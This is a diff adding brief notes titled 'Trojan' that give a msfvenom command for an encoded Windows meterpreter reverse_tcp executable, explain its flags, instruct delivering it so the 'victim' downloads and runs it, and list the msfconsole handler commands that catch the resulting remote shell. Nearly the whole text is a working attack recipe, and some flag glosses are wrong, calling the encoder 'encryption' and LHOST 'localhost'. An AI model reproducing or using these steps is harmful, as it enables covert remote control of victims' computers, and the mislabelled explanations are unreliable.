@@ -1,0 +1,33 @@
+Trojan:
+
+# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 1 -f exe LHOST=<kaliIP> LPORT=6666 > ~/Desktop/payload.exe
+
+ -p = Payload type which is the reverse_tcp
+
+ -e = encryption type
+
+ -i = no. of iterations of encryptions
+
+ -f = output format type
+
+ LHOST = localhost IP address
+
+ LPORT = localport for listener
+
+ > = output file and location.
+
+ Send file via apache web server / by anyother means and make victim download and execute it.
+
+ But before execute.:
+
+ # msfconsole
+
+ > use exploit/multi/handler
+
+ > set PAYLOAD windows/meterpreter/reverse_tcp
+
+ > set LHOST 192.168.88.x
+
+ > set LPORT 6666
+
+ > exploit
